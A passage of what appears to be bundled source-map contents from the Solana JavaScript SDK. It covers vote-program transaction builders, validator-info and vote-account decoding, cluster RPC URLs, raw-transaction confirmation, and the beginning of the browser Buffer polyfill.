VoteInstructionInputData['UpdateValidatorIdentity']\n    >([BufferLayout.u32('instruction')]),\n  },\n  AuthorizeWithSeed: {\n    index: 10,\n    layout: BufferLayout.struct<VoteInstructionInputData['AuthorizeWithSeed']>([\n      BufferLayout.u32('instruction'),\n      Layout.voteAuthorizeWithSeedArgs(),\n    ]),\n  },\n});\n\n/**\n * VoteAuthorize type\n */\nexport type VoteAuthorizationType = {\n  /** The VoteAuthorize index (from solana-vote-program) */\n  index: number;\n};\n\n/**\n * An enumeration of valid VoteAuthorization layouts.\n */\nexport const VoteAuthorizationLayout = Object.freeze({\n  Voter: {\n    index: 0,\n  },\n  Withdrawer: {\n    index: 1,\n  },\n});\n\n/**\n * Factory class for transactions to interact with the Vote program\n */\nexport class VoteProgram {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the Vote program\n   */\n  static programId: PublicKey = new PublicKey(\n    'Vote111111111111111111111111111111111111111',\n  );\n\n  /**\n   * Max space of a Vote account\n   *\n   * This is generated from the solana-vote-program VoteState struct as\n   * `VoteState::size_of()`:\n   * https://docs.rs/solana-vote-program/1.9.5/solana_vote_program/vote_state/struct.VoteState.html#method.size_of\n   *\n   * KEEP IN SYNC WITH `VoteState::size_of()` in https://github.com/solana-labs/solana/blob/a474cb24b9238f5edcc982f65c0b37d4a1046f7e/sdk/program/src/vote/state/mod.rs#L340-L342\n   */\n  static space: number = 3762;\n\n  /**\n   * Generate an Initialize instruction.\n   */\n  static initializeAccount(\n    params: InitializeAccountParams,\n  ): TransactionInstruction {\n    const {votePubkey, nodePubkey, voteInit} = params;\n    const type = VOTE_INSTRUCTION_LAYOUTS.InitializeAccount;\n    const data = encodeData(type, {\n      voteInit: {\n        nodePubkey: toBuffer(voteInit.nodePubkey.toBuffer()),\n        authorizedVoter: toBuffer(voteInit.authorizedVoter.toBuffer()),\n        authorizedWithdrawer: toBuffer(\n          voteInit.authorizedWithdrawer.toBuffer(),\n        ),\n        commission: voteInit.commission,\n      },\n    });\n    const instructionData = {\n      keys: [\n        {pubkey: votePubkey, isSigner: false, isWritable: true},\n        {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},\n        {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n        {pubkey: nodePubkey, isSigner: true, isWritable: false},\n      ],\n      programId: this.programId,\n      data,\n    };\n    return new TransactionInstruction(instructionData);\n  }\n\n  /**\n   * Generate a transaction that creates a new Vote account.\n   */\n  static createAccount(params: CreateVoteAccountParams): Transaction {\n    const transaction = new Transaction();\n    transaction.add(\n      SystemProgram.createAccount({\n        fromPubkey: params.fromPubkey,\n        newAccountPubkey: params.votePubkey,\n        lamports: params.lamports,\n        space: this.space,\n        programId: this.programId,\n      }),\n    );\n\n    return transaction.add(\n      this.initializeAccount({\n        votePubkey: params.votePubkey,\n        nodePubkey: params.voteInit.nodePubkey,\n        voteInit: params.voteInit,\n      }),\n    );\n  }\n\n  /**\n   * Generate a transaction that authorizes a new Voter or Withdrawer on the Vote account.\n   */\n  static authorize(params: AuthorizeVoteParams): Transaction {\n    const {\n      votePubkey,\n      authorizedPubkey,\n      newAuthorizedPubkey,\n      voteAuthorizationType,\n    } = params;\n\n    const type = VOTE_INSTRUCTION_LAYOUTS.Authorize;\n    const data = encodeData(type, {\n      newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),\n      voteAuthorizationType: voteAuthorizationType.index,\n    });\n\n    const keys = [\n      {pubkey: votePubkey, isSigner: false, isWritable: true},\n      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n      {pubkey: authorizedPubkey, isSigner: true, isWritable: false},\n    ];\n\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction that authorizes a new Voter or Withdrawer on the Vote account\n   * where the current Voter or Withdrawer authority is a derived key.\n   */\n  static authorizeWithSeed(params: AuthorizeVoteWithSeedParams): Transaction {\n    const {\n      currentAuthorityDerivedKeyBasePubkey,\n      currentAuthorityDerivedKeyOwnerPubkey,\n      currentAuthorityDerivedKeySeed,\n      newAuthorizedPubkey,\n      voteAuthorizationType,\n      votePubkey,\n    } = params;\n\n    const type = VOTE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed;\n    const data = encodeData(type, {\n      voteAuthorizeWithSeedArgs: {\n        currentAuthorityDerivedKeyOwnerPubkey: toBuffer(\n          currentAuthorityDerivedKeyOwnerPubkey.toBuffer(),\n        ),\n        currentAuthorityDerivedKeySeed: currentAuthorityDerivedKeySeed,\n        newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),\n        voteAuthorizationType: voteAuthorizationType.index,\n      },\n    });\n\n    const keys = [\n      {pubkey: votePubkey, isSigner: false, isWritable: true},\n      {pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false},\n      {\n        pubkey: currentAuthorityDerivedKeyBasePubkey,\n        isSigner: true,\n        isWritable: false,\n      },\n    ];\n\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction to withdraw from a Vote account.\n   */\n  static withdraw(params: WithdrawFromVoteAccountParams): Transaction {\n    const {votePubkey, authorizedWithdrawerPubkey, lamports, toPubkey} = params;\n    const type = VOTE_INSTRUCTION_LAYOUTS.Withdraw;\n    const data = encodeData(type, {lamports});\n\n    const keys = [\n      {pubkey: votePubkey, isSigner: false, isWritable: true},\n      {pubkey: toPubkey, isSigner: false, isWritable: true},\n      {pubkey: authorizedWithdrawerPubkey, isSigner: true, isWritable: false},\n    ];\n\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n\n  /**\n   * Generate a transaction to withdraw safely from a Vote account.\n   *\n   * This function was created as a safeguard for vote accounts running validators, `safeWithdraw`\n   * checks that the withdraw amount will not exceed the specified balance while leaving enough left\n   * to cover rent. If you wish to close the vote account by withdrawing the full amount, call the\n   * `withdraw` method directly.\n   */\n  static safeWithdraw(\n    params: WithdrawFromVoteAccountParams,\n    currentVoteAccountBalance: number,\n    rentExemptMinimum: number,\n  ): Transaction {\n    if (params.lamports > currentVoteAccountBalance - rentExemptMinimum) {\n      throw new Error(\n        'Withdraw will leave vote account with insufficient funds.',\n      );\n    }\n    return VoteProgram.withdraw(params);\n  }\n\n  /**\n   * Generate a transaction to update the validator identity (node pubkey) of a Vote account.\n   */\n  static updateValidatorIdentity(\n    params: UpdateValidatorIdentityParams,\n  ): Transaction {\n    const {votePubkey, authorizedWithdrawerPubkey, nodePubkey} = params;\n    const type = VOTE_INSTRUCTION_LAYOUTS.UpdateValidatorIdentity;\n    const data = encodeData(type);\n\n    const keys = [\n      {pubkey: votePubkey, isSigner: false, isWritable: true},\n      {pubkey: nodePubkey, isSigner: true, isWritable: false},\n      {pubkey: authorizedWithdrawerPubkey, isSigner: true, isWritable: false},\n    ];\n\n    return new Transaction().add({\n      keys,\n      programId: this.programId,\n      data,\n    });\n  }\n}\n","import {Buffer} from 'buffer';\nimport {\n  assert as assertType,\n  optional,\n  string,\n  type as pick,\n} from 'superstruct';\n\nimport * as Layout from './layout';\nimport * as shortvec from './utils/shortvec-encoding';\nimport {PublicKey, PUBLIC_KEY_LENGTH} from './publickey';\nimport {guardedShift, guardedSplice} from './utils/guarded-array-utils';\n\nexport const VALIDATOR_INFO_KEY = new PublicKey(\n  'Va1idator1nfo111111111111111111111111111111',\n);\n\n/**\n * @internal\n */\ntype ConfigKey = {\n  publicKey: PublicKey;\n  isSigner: boolean;\n};\n\n/**\n * Info used to identity validators.\n */\nexport type Info = {\n  /** validator name */\n  name: string;\n  /** optional, validator website */\n  website?: string;\n  /** optional, extra information the validator chose to share */\n  details?: string;\n  /** optional, validator logo URL */\n  iconUrl?: string;\n  /** optional, used to identify validators on keybase.io */\n  keybaseUsername?: string;\n};\n\nconst InfoString = pick({\n  name: string(),\n  website: optional(string()),\n  details: optional(string()),\n  iconUrl: optional(string()),\n  keybaseUsername: optional(string()),\n});\n\n/**\n * ValidatorInfo class\n */\nexport class ValidatorInfo {\n  /**\n   * validator public key\n   */\n  key: PublicKey;\n  /**\n   * validator information\n   */\n  info: Info;\n\n  /**\n   * Construct a valid ValidatorInfo\n   *\n   * @param key validator public key\n   * @param info validator information\n   */\n  constructor(key: PublicKey, info: Info) {\n    this.key = key;\n    this.info = info;\n  }\n\n  /**\n   * Deserialize ValidatorInfo from the config account data. Exactly two config\n   * keys are required in the data.\n   *\n   * @param buffer config account data\n   * @return null if info was not found\n   */\n  static fromConfigData(\n    buffer: Buffer | Uint8Array | Array<number>,\n  ): ValidatorInfo | null {\n    let byteArray = [...buffer];\n    const configKeyCount = shortvec.decodeLength(byteArray);\n    if (configKeyCount !== 2) return null;\n\n    const configKeys: Array<ConfigKey> = [];\n    for (let i = 0; i < 2; i++) {\n      const publicKey = new PublicKey(\n        guardedSplice(byteArray, 0, PUBLIC_KEY_LENGTH),\n      );\n      const isSigner = guardedShift(byteArray) === 1;\n      configKeys.push({publicKey, isSigner});\n    }\n\n    if (configKeys[0].publicKey.equals(VALIDATOR_INFO_KEY)) {\n      if (configKeys[1].isSigner) {\n        const rawInfo: any = Layout.rustString().decode(Buffer.from(byteArray));\n        const info = JSON.parse(rawInfo as string);\n        assertType(info, InfoString);\n        return new ValidatorInfo(configKeys[1].publicKey, info);\n      }\n    }\n\n    return null;\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\nimport type {Buffer} from 'buffer';\n\nimport * as Layout from './layout';\nimport {PublicKey} from './publickey';\nimport {toBuffer} from './utils/to-buffer';\n\nexport const VOTE_PROGRAM_ID = new PublicKey(\n  'Vote111111111111111111111111111111111111111',\n);\n\nexport type Lockout = {\n  slot: number;\n  confirmationCount: number;\n};\n\n/**\n * History of how many credits earned by the end of each epoch\n */\nexport type EpochCredits = Readonly<{\n  epoch: number;\n  credits: number;\n  prevCredits: number;\n}>;\n\nexport type AuthorizedVoter = Readonly<{\n  epoch: number;\n  authorizedVoter: PublicKey;\n}>;\n\ntype AuthorizedVoterRaw = Readonly<{\n  authorizedVoter: Uint8Array;\n  epoch: number;\n}>;\n\ntype PriorVoters = Readonly<{\n  buf: PriorVoterRaw[];\n  idx: number;\n  isEmpty: number;\n}>;\n\nexport type PriorVoter = Readonly<{\n  authorizedPubkey: PublicKey;\n  epochOfLastAuthorizedSwitch: number;\n  targetEpoch: number;\n}>;\n\ntype PriorVoterRaw = Readonly<{\n  authorizedPubkey: Uint8Array;\n  epochOfLastAuthorizedSwitch: number;\n  targetEpoch: number;\n}>;\n\nexport type BlockTimestamp = Readonly<{\n  slot: number;\n  timestamp: number;\n}>;\n\ntype VoteAccountData = Readonly<{\n  authorizedVoters: AuthorizedVoterRaw[];\n  authorizedWithdrawer: Uint8Array;\n  commission: number;\n  epochCredits: EpochCredits[];\n  lastTimestamp: BlockTimestamp;\n  nodePubkey: Uint8Array;\n  priorVoters: PriorVoters;\n  rootSlot: number;\n  rootSlotValid: number;\n  votes: Lockout[];\n}>;\n\n/**\n * See https://github.com/solana-labs/solana/blob/8a12ed029cfa38d4a45400916c2463fb82bbec8c/programs/vote_api/src/vote_state.rs#L68-L88\n *\n * @internal\n */\nconst VoteAccountLayout = BufferLayout.struct<VoteAccountData>([\n  Layout.publicKey('nodePubkey'),\n  Layout.publicKey('authorizedWithdrawer'),\n  BufferLayout.u8('commission'),\n  BufferLayout.nu64(), // votes.length\n  BufferLayout.seq<Lockout>(\n    BufferLayout.struct([\n      BufferLayout.nu64('slot'),\n      BufferLayout.u32('confirmationCount'),\n    ]),\n    BufferLayout.offset(BufferLayout.u32(), -8),\n    'votes',\n  ),\n  BufferLayout.u8('rootSlotValid'),\n  BufferLayout.nu64('rootSlot'),\n  BufferLayout.nu64(), // authorizedVoters.length\n  BufferLayout.seq<AuthorizedVoterRaw>(\n    BufferLayout.struct([\n      BufferLayout.nu64('epoch'),\n      Layout.publicKey('authorizedVoter'),\n    ]),\n    BufferLayout.offset(BufferLayout.u32(), -8),\n    'authorizedVoters',\n  ),\n  BufferLayout.struct<PriorVoters>(\n    [\n      BufferLayout.seq(\n        BufferLayout.struct([\n          Layout.publicKey('authorizedPubkey'),\n          BufferLayout.nu64('epochOfLastAuthorizedSwitch'),\n          BufferLayout.nu64('targetEpoch'),\n        ]),\n        32,\n        'buf',\n      ),\n      BufferLayout.nu64('idx'),\n      BufferLayout.u8('isEmpty'),\n    ],\n    'priorVoters',\n  ),\n  BufferLayout.nu64(), // epochCredits.length\n  BufferLayout.seq<EpochCredits>(\n    BufferLayout.struct([\n      BufferLayout.nu64('epoch'),\n      BufferLayout.nu64('credits'),\n      BufferLayout.nu64('prevCredits'),\n    ]),\n    BufferLayout.offset(BufferLayout.u32(), -8),\n    'epochCredits',\n  ),\n  BufferLayout.struct<BlockTimestamp>(\n    [BufferLayout.nu64('slot'), BufferLayout.nu64('timestamp')],\n    'lastTimestamp',\n  ),\n]);\n\ntype VoteAccountArgs = {\n  nodePubkey: PublicKey;\n  authorizedWithdrawer: PublicKey;\n  commission: number;\n  rootSlot: number | null;\n  votes: Lockout[];\n  authorizedVoters: AuthorizedVoter[];\n  priorVoters: PriorVoter[];\n  epochCredits: EpochCredits[];\n  lastTimestamp: BlockTimestamp;\n};\n\n/**\n * VoteAccount class\n */\nexport class VoteAccount {\n  nodePubkey: PublicKey;\n  authorizedWithdrawer: PublicKey;\n  commission: number;\n  rootSlot: number | null;\n  votes: Lockout[];\n  authorizedVoters: AuthorizedVoter[];\n  priorVoters: PriorVoter[];\n  epochCredits: EpochCredits[];\n  lastTimestamp: BlockTimestamp;\n\n  /**\n   * @internal\n   */\n  constructor(args: VoteAccountArgs) {\n    this.nodePubkey = args.nodePubkey;\n    this.authorizedWithdrawer = args.authorizedWithdrawer;\n    this.commission = args.commission;\n    this.rootSlot = args.rootSlot;\n    this.votes = args.votes;\n    this.authorizedVoters = args.authorizedVoters;\n    this.priorVoters = args.priorVoters;\n    this.epochCredits = args.epochCredits;\n    this.lastTimestamp = args.lastTimestamp;\n  }\n\n  /**\n   * Deserialize VoteAccount from the account data.\n   *\n   * @param buffer account data\n   * @return VoteAccount\n   */\n  static fromAccountData(\n    buffer: Buffer | Uint8Array | Array<number>,\n  ): VoteAccount {\n    const versionOffset = 4;\n    const va = VoteAccountLayout.decode(toBuffer(buffer), versionOffset);\n\n    let rootSlot: number | null = va.rootSlot;\n    if (!va.rootSlotValid) {\n      rootSlot = null;\n    }\n\n    return new VoteAccount({\n      nodePubkey: new PublicKey(va.nodePubkey),\n      authorizedWithdrawer: new PublicKey(va.authorizedWithdrawer),\n      commission: va.commission,\n      votes: va.votes,\n      rootSlot,\n      authorizedVoters: va.authorizedVoters.map(parseAuthorizedVoter),\n      priorVoters: getPriorVoters(va.priorVoters),\n      epochCredits: va.epochCredits,\n      lastTimestamp: va.lastTimestamp,\n    });\n  }\n}\n\nfunction parseAuthorizedVoter({\n  authorizedVoter,\n  epoch,\n}: AuthorizedVoterRaw): AuthorizedVoter {\n  return {\n    epoch,\n    authorizedVoter: new PublicKey(authorizedVoter),\n  };\n}\n\nfunction parsePriorVoters({\n  authorizedPubkey,\n  epochOfLastAuthorizedSwitch,\n  targetEpoch,\n}: PriorVoterRaw): PriorVoter {\n  return {\n    authorizedPubkey: new PublicKey(authorizedPubkey),\n    epochOfLastAuthorizedSwitch,\n    targetEpoch,\n  };\n}\n\nfunction getPriorVoters({buf, idx, isEmpty}: PriorVoters): PriorVoter[] {\n  if (isEmpty) {\n    return [];\n  }\n\n  return [\n    ...buf.slice(idx + 1).map(parsePriorVoters),\n    ...buf.slice(0, idx).map(parsePriorVoters),\n  ];\n}\n","const endpoint = {\n  http: {\n    devnet: 'http://api.devnet.solana.com',\n    testnet: 'http://api.testnet.solana.com',\n    'mainnet-beta': 'http://api.mainnet-beta.solana.com/',\n  },\n  https: {\n    devnet: 'https://api.devnet.solana.com',\n    testnet: 'https://api.testnet.solana.com',\n    'mainnet-beta': 'https://api.mainnet-beta.solana.com/',\n  },\n};\n\nexport type Cluster = 'devnet' | 'testnet' | 'mainnet-beta';\n\n/**\n * Retrieves the RPC API URL for the specified cluster\n * @param {Cluster} [cluster=\"devnet\"] - The cluster name of the RPC API URL to use. Possible options: 'devnet' | 'testnet' | 'mainnet-beta'\n * @param {boolean} [tls=\"http\"] - Use TLS when connecting to cluster.\n *\n * @returns {string} URL string of the RPC endpoint\n */\nexport function clusterApiUrl(cluster?: Cluster, tls?: boolean): string {\n  const key = tls === false ? 'http' : 'https';\n\n  if (!cluster) {\n    return endpoint[key]['devnet'];\n  }\n\n  const url = endpoint[key][cluster];\n  if (!url) {\n    throw new Error(`Unknown ${key} cluster: ${cluster}`);\n  }\n  return url;\n}\n","import type {Buffer} from 'buffer';\n\nimport {\n  BlockheightBasedTransactionConfirmationStrategy,\n  Connection,\n  DurableNonceTransactionConfirmationStrategy,\n  TransactionConfirmationStrategy,\n} from '../connection';\nimport type {TransactionSignature} from '../transaction';\nimport type {ConfirmOptions} from '../connection';\nimport {SendTransactionError} from '../errors';\n\n/**\n * Send and confirm a raw transaction\n *\n * If `commitment` option is not specified, defaults to 'max' commitment.\n *\n * @param {Connection} connection\n * @param {Buffer} rawTransaction\n * @param {TransactionConfirmationStrategy} confirmationStrategy\n * @param {ConfirmOptions} [options]\n * @returns {Promise<TransactionSignature>}\n */\nexport async function sendAndConfirmRawTransaction(\n  connection: Connection,\n  rawTransaction: Buffer,\n  confirmationStrategy: TransactionConfirmationStrategy,\n  options?: ConfirmOptions,\n): Promise<TransactionSignature>;\n\n/**\n * @deprecated Calling `sendAndConfirmRawTransaction()` without a `confirmationStrategy`\n * is no longer supported and will be removed in a future version.\n */\n// eslint-disable-next-line no-redeclare\nexport async function sendAndConfirmRawTransaction(\n  connection: Connection,\n  rawTransaction: Buffer,\n  options?: ConfirmOptions,\n): Promise<TransactionSignature>;\n\n// eslint-disable-next-line no-redeclare\nexport async function sendAndConfirmRawTransaction(\n  connection: Connection,\n  rawTransaction: Buffer,\n  confirmationStrategyOrConfirmOptions:\n    | TransactionConfirmationStrategy\n    | ConfirmOptions\n    | undefined,\n  maybeConfirmOptions?: ConfirmOptions,\n): Promise<TransactionSignature> {\n  let confirmationStrategy: TransactionConfirmationStrategy | undefined;\n  let options: ConfirmOptions | undefined;\n  if (\n    confirmationStrategyOrConfirmOptions &&\n    Object.prototype.hasOwnProperty.call(\n      confirmationStrategyOrConfirmOptions,\n      'lastValidBlockHeight',\n    )\n  ) {\n    confirmationStrategy =\n      confirmationStrategyOrConfirmOptions as BlockheightBasedTransactionConfirmationStrategy;\n    options = maybeConfirmOptions;\n  } else if (\n    confirmationStrategyOrConfirmOptions &&\n    Object.prototype.hasOwnProperty.call(\n      confirmationStrategyOrConfirmOptions,\n      'nonceValue',\n    )\n  ) {\n    confirmationStrategy =\n      confirmationStrategyOrConfirmOptions as DurableNonceTransactionConfirmationStrategy;\n    options = maybeConfirmOptions;\n  } else {\n    options = confirmationStrategyOrConfirmOptions as\n      | ConfirmOptions\n      | undefined;\n  }\n  const sendOptions = options && {\n    skipPreflight: options.skipPreflight,\n    preflightCommitment: options.preflightCommitment || options.commitment,\n    minContextSlot: options.minContextSlot,\n  };\n\n  const signature = await connection.sendRawTransaction(\n    rawTransaction,\n    sendOptions,\n  );\n\n  const commitment = options && options.commitment;\n  const confirmationPromise = confirmationStrategy\n    ? connection.confirmTransaction(confirmationStrategy, commitment)\n    : connection.confirmTransaction(signature, commitment);\n  const status = (await confirmationPromise).value;\n\n  if (status.err) {\n    if (signature != null) {\n      throw new SendTransactionError({\n        action: sendOptions?.skipPreflight ? 'send' : 'simulate',\n        signature: signature,\n        transactionMessage: `Status: (${JSON.stringify(status)})`,\n      });\n    }\n    throw new Error(\n      `Raw transaction ${signature} failed (${JSON.stringify(status)})`,\n    );\n  }\n\n  return signature;\n}\n","export * from './account';\nexport * from './blockhash';\nexport * from './bpf-loader-deprecated';\nexport * from './bpf-loader';\nexport * from './connection';\nexport * from './epoch-schedule';\nexport * from './errors';\nexport * from './fee-calculator';\nexport * from './keypair';\nexport * from './loader';\nexport * from './message';\nexport * from './nonce-account';\nexport * from './programs';\nexport * from './publickey';\nexport * from './transaction';\nexport * from './validator-info';\nexport * from './vote-account';\nexport * from './sysvar';\nexport * from './utils';\n\n/**\n * There are 1-billion lamports in one SOL\n */\nexport const LAMPORTS_PER_SOL = 1000000000;\n","/*!\n * The buffer module from node.js, for the browser.\n *\n * @author   Feross Aboukhadijeh <https://feross.org>\n * @license  MIT\n */\n/* eslint-disable no-proto */\n\n'use strict'\n\nconst base64 = require('base64-js')\nconst ieee754 = require('ieee754')\nconst customInspectSymbol =\n  (typeof Symbol === 'function' && typeof Symbol['for'] === 'function') // eslint-disable-line dot-notation\n    ? Symbol['for']('nodejs.util.inspect.custom') // eslint-disable-line dot-notation\n    : null\n\nexports.Buffer = Buffer\nexports.SlowBuffer = SlowBuffer\nexports.INSPECT_MAX_BYTES = 50\n\nconst K_MAX_LENGTH = 0x7fffffff\nexports.kMaxLength = K_MAX_LENGTH\n\n/**\n * If `Buffer.TYPED_ARRAY_SUPPORT`:\n *   === true    Use Uint8Array implementation (fastest)\n *   === false   Print warning and recommend using `buffer` v4.x which has an Object\n *               implementation (most compatible, even IE6)\n *\n * Browsers that support typed arrays are IE 10+, Firefox 4+, Chrome 7+, Safari 5.1+,\n * Opera 11.6+, iOS 4.2+.\n *\n * We report that the browser does not support typed arrays if the are not subclassable\n * using __proto__. Firefox 4-29 lacks support for adding new properties to `Uint8Array`\n * (See: https://bugzilla.mozilla.org/show_bug.cgi?id=695438). IE 10 lacks support\n * for __proto__ and has a buggy typed array implementation.\n */\nBuffer.TYPED_ARRAY_SUPPORT = typedArraySupport()\n\nif (!Buffer.TYPED_ARRAY_SUPPORT && typeof console !== 'undefined' &&\n    typeof console.error === 'function') {\n  console.error(\n    'This browser lacks typed array (Uint8Array) support which is required by ' +\n    '`buffer` v5.x. Use `buffer` v4.x if you require old browser support.'\n  )\n}\n\nfunction typedArraySupport () {\n  // Can typed array instances can be augmented?\n  try {\n    const arr = new Uint8Array(1)\n    const proto = { foo: function () { return 42 } }\n    Object.setPrototypeOf(proto, Uint8Array.prototype)\n    Object.setPrototypeOf(arr, proto)\n    return arr.foo() === 42\n  } catch (e) {\n    return false\n  }\n}\n\nObject.defineProperty(Buffer.prototype, 'parent', {\n  enumerable: true,\n  get: function () {\n    if (!Buffer.isBuffer(this)) return undefined\n    return this.buffer\n  }\n})\n\nObject.defineProperty(Buffer.prototype, 'offset', {\n  enumerable: true,\n  get: function () {\n    if (!Buffer.isBuffer(this)) return undefined\n    return this.byteOffset\n  }\n})\n\nfunction createBuffer (length) {\n  if (length > K_MAX_LENGTH) {\n    throw new RangeError('The value \"' + length + '\" is invalid for option \"size\"')\n  }\n  // Return an augmented `Uint8Array` instance\n  const buf = new Uint8Array(length)\n  Object.setPrototypeOf(buf, Buffer.prototype)\n  return buf\n}\n\n/**\n * The Buffer constructor returns instances of `Uint8Array` that have their\n * prototype changed to `Buffer.prototype`. Furthermore, `Buffer` is a subclass of\n * `Uint8Array`, so the returned instances will have all the node `Buffer` methods\n * and the `Uint8Array` methods. Square bracket notation works as expected -- it\n * returns a single octet.\n *\n * The `Uint8Array` prototype remains unmodified.\n */\n\nfunction Buffer (arg, encodingOrOffset, length) {\n  // Common case.\n  if (typeof arg === 'number') {\n    if (typeof encodingOrOffset === 'string') {\n      throw new TypeError(\n        'The \"string\" argument must be of type string. Received type number'\n      )\n    }\n    return allocUnsafe(arg)\n  }\n  return from(arg, encodingOrOffset, length)\n}\n\nBuffer.poolSize = 8192 // not used by this implementation\n\nfunction from (value, encodingOrOffset, length) {\n  if (typeof value === 'string') {\n    return fromString(value, encodingOrOffset)\n  }\n\n  if (ArrayBuffer.isView(value)) {\n    return fromArrayView(value)\n  }\n\n  if (value == null) {\n    throw new TypeError(\n      'The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' +\n      'or Array-like Object. Received type ' + (typeof value)\n    )\n  }\n\n  if (isInstance(value, ArrayBuffer) ||\n      (value && isInstance(value.buffer, ArrayBuffer))) {\n    return fromArrayBuffer(value, encodingOrOffset, length)\n  }\n\n  if (typeof SharedArrayBuffer !== 'undefined' &&\n      (isInstance(value, SharedArrayBuffer) ||\n      (value && isInstance(value.buffer, SharedArrayBuffer)))) {\n    return fromArrayBuffer(value, encodingOrOffset, length)\n  }\n\n  if (typeof value === 'number') {\n    throw new TypeError(\n      'The \"value\" argument must not be of type number. Received type number'\n    )\n  }\n\n  const valueOf = value.valueOf && value.valueOf()\n  if (valueOf != null && valueOf !== value) {\n    return Buffer.from(valueOf, encodingOrOffset, length)\n  }\n\n  const b = fromObject(value)\n  if (b) return b\n\n  if (typeof Symbol !== 'undefined' && Symbol.toPrimitive != null &&\n      typeof value[Symbol.toPrimitive] === 'function') {\n    return Buffer.from(value[Symbol.toPrimitive]('string'), encodingOrOffset, length)\n  }\n\n  throw new TypeError(\n    'The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' +\n    'or Array-like Object. Received type ' + (typeof value)\n  )\n}\n\n/**\n * Functionally equivalent to Buffer(arg, encoding) but throws a TypeError\n * if value is a number.\n * Buffer.from(str[, encoding])\n * Buffer.from(array)\n * Buffer.from(buffer)\n * Buffer.from(arrayBuffer[, byteOffset[, length]])\n **/\nBuffer.from = function (value, encodingOrOffset, length) {\n  return from(value, encodingOrOffset, length)\n}\n\n// Note: Change prototype *after* Buffer.from is defined to workaround Chrome bug:\n// https://github.com/feross/buffer/pull/148\nObject.setPrototypeOf(Buffer.prototype, Uint8Array.prototype)\nObject.setPrototypeOf(Buffer, Uint8Array)\n\nfunction assertSize (size) {\n  if (typeof size !== 'number') {\n    throw new TypeError('\"size\" argument must be of type number')\n  } else if (size < 0) {\n    throw new RangeError('The value \"' + size + '\" is invalid for option \"size\"')\n  }\n}\n\nfunction alloc (size, fill, encoding) {\n  assertSize(size)\n  if (size <= 0) {\n    return createBuffer(size)\n  }\n  if (fill !== undefined) {\n    // Only pay attention to encoding if it's a string. This\n    // prevents accidentally sending in a number that would\n    // be interpreted as a start offset.\n    return typeof encoding === 'string'\n      ? createBuffer(size).fill(fill, encoding)\n      : createBuffer(size).fill(fill)\n  }\n  return createBuffer(size)\n}\n\n/**\n * Creates a new filled Buffer instance.\n * alloc(size[, fill[, encoding]])\n **/\nBuffer.alloc = function (size, fill, encoding) {\n  return alloc(size, fill, encoding)\n}\n\nfunction allocUnsafe (size) {\n  assertSize(size)\n  return createBuffer(size < 0 ? 0 : checked(size) | 0)\n}\n\n/**\n * Equivalent to Buffer(num), by default creates a non-zero-filled Buffer instance.\n * */\nBuffer.allocUnsafe = function (size) {\n  return allocUnsafe(size)\n}\n/**\n * Equivalent to SlowBuffer(num), by default creates a non-zero-filled Buffer instance.\n */\nBuffer.allocUnsafeSlow = function (size) {\n  return allocUnsafe(size)\n}\n\nfunction fromString (string, encoding) {\n  if (typeof encoding !== 'string' || encoding === '') {\n    encoding = 'utf8'\n  }\n\n  if (!Buffer.isEncoding(encoding)) {\n    throw new TypeError('Unknown encoding: ' + encoding)\n  }\n\n  const length = byteLength(string, encoding) | 0\n  let buf = createBuffer(length)\n\n  const actual = buf.write(string, encoding)\n\n  if (actual !== length) {\n    // Writing a hex string, for example, that contains invalid characters will\n    // cause everything after the first invalid character to be ignored. (e.g.\n    // 'abxxcd' will be treated as 'ab')\n    buf = buf.slice(0, actual)\n  }\n\n  return buf\n}\n\nfunction fromArrayLike (array) {\n  const length = array.length < 0 ? 0 : checked(array.length) | 0\n  const buf = createBuffer(length)\n  for (let i = 0; i < length; i += 1) {\n    buf[i] = array[i] & 255\n  }\n  return buf\n}\n\nfunction fromArrayView (arrayView) {\n  if (isInstance(arrayView, Uint8Array)) {\n    const copy = new Uint8Array(arrayView)\n    return fromArrayBuffer(copy.buffer, copy.byteOffset, copy.byteLength)\n  }\n  return fromArrayLike(arrayView)\n}\n\nfunction fromArrayBuffer (array, byteOffset, length) {\n  if (byteOffset < 0 || array.byteLength < byteOffset) {\n    throw new RangeError('\"offset\" is outside of buffer bounds')\n  }\n\n  if (array.byteLength < byteOffset + (length || 0)) {\n    throw new RangeError('\"length\" is outside of buffer bounds')\n  }\n\n  let buf\n  if (byteOffset === undefined && length === undefined) {\n    buf = new Uint8Array(array)\n  } else if (length === undefined) {\n    buf = new Uint8Array(array, byteOffset)\n  } else {\n    buf = new Uint8Array(array, byteOffset, length)\n  }\n\n  // Return an augmented `Uint8Array` instance\n  Object.setPrototypeOf(buf, Buffer.prototype)\n\n  return buf\n}\n\nfunction fromObject (obj) {\n  if (Buffer.isBuffer(obj)) {\n    const len = checked(obj.length) | 0\n    const buf = createBuffer(len)\n\n    if (buf.length === 0) {\n      return buf\n    }\n\n    obj.copy(buf, 0, 0, len)\n    return buf\n  }\n\n  if (obj.length !== undefined) {\n    if (typeof obj.length !== 'number' || numberIsNaN(obj.length)) {\n      return createBuffer(0)\n    }\n    return fromArrayLike(obj)\n  }\n\n  if (obj.type === 'Buffer' && Array.isArray(obj.data)) {\n    return fromArrayLike(obj.data)\n  }\n}\n\nfunction checked (length) {\n  // Note: cannot use `length < K_MAX_LENGTH` here because that fails when\n  // length is NaN (which is otherwise coerced to zero.)\n  if (length >= K_MAX_LENGTH) {\n    throw new RangeError('Attempt to allocate Buffer larger than maximum ' +\n                         'size: 0x' + K_MAX_LENGTH.toString(16) + ' bytes')\n  }\n  return length | 0\n}\n\nfunction SlowBuffer (length) {\n  if (+length != length) { // eslint-disable-line eqeqeq\n    length = 